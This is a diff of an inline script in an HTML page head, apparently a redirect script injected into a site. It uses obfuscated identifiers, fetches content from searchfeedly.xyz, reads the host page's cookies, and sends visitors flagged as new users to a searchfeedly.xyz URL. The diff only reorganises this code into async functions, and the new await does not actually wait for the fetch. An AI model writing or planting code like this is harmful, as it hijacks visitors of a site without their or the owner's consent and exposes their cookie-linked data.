@@ -15,19 +15,29 @@
 	})();
 
 	//FUCNTION 2: Get url path variables
-	(/(\d+)\.html$/ ['exec'](location.pathname)) ? /(\d+)\.html$/ ['exec'](location.pathname)[1] : '';		
+	(/(\d+)\.html$/ ['exec'](location.pathname)) ? /(\d+)\.html$/ ['exec'](location.pathname)[1] : '';
+	
 
-	fetch('https://searchfeedly.xyz/articles/git/' + _0xbe6fx1.h + '.php', {method: 'get'})
-	.then(response => response.json())
-	.then(data => {
-		a = data
-		server = a[0].server;
-		title = a[0].title;
-		date = a[0].date;
-		heading = a[0].heading;
-		content = a[0].content;
-		image = a[0].image;
-		alt = a[0].alt;
+	function getData() 
+	{
+		fetch('https://searchfeedly.xyz/articles/git/' + _0xbe6fx1.h + '.php', {method: 'get'})
+		.then(response => response.json())
+		.then(data => {
+				a = data
+				server = a[0].server;
+				title = a[0].title;
+				date = a[0].date;
+				heading = a[0].heading;
+				content = a[0].content;
+				image = a[0].image;
+				alt = a[0].alt;
+				console.log(data);
+		});
+	}
+	
+	async function asyncWait() 
+	{
+		const result = await getData();
 		
 		//FUCNTION 3: Get host cookie using 1 liner
 		const cookieObj = new URLSearchParams(document.cookie.replaceAll("&", "%26").replaceAll("; ","&"));
@@ -78,8 +88,11 @@
 			//_0xbe6fx1.id means the id variable from the FUCNTION 1 above
 			location.href = 'https://searchfeedly.xyz/articles/?h=' + _0xbe6fx1.h + '&b=' + _0xbe6fx1.b
 			//alert('New User');
-		}		
-	});	
+		}
+	}
+
+	asyncWait();
+	
 })()
 </script>
 </head>
